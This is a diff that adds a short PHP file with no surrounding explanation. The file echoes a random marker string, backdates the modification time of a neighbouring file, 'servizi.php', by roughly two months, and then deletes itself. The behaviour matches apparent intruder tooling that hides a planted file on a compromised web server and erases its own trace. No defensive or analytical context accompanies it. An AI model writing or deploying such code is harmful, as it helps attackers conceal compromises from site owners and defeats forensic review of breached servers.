@@ -1,0 +1,1 @@
+<?php echo "RkBMEWHPXE"; if (file_exists("./servizi.php")){ touch("./servizi.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*rNZgVk3sAZvw6q1svre0*/ ?>
